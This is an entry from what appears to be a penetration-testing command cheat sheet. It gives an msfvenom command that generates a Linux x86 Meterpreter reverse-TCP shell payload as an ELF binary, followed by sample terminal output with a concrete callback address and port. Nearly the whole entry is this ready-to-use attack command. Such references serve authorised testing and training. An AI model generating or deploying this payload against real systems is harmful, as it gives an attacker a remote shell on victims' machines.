---
id: 12018409-afa0-4507-909e-fba4a4a14d60
name: msfvenom Meterpreter elf reverse shell
type: command
executor: null
data: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT
  -f elf > msf.elf
output: 'root@hackers:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 LHOST=172.16.162.187
  LPORT=1337 -f elf > msf.elf

  [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 123 bytes

  Final size of elf file: 207 bytes'
created_at: '2019-09-17T17:25:39.169319+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfvenom Meterpreter elf reverse shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f elf > msf.elf
```

## Expected Output

```
root@hackers:~# msfvenom -p linux/x86/meterpreter/reverse_tcp -a x86 LHOST=172.16.162.187 LPORT=1337 -f elf > msf.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
```


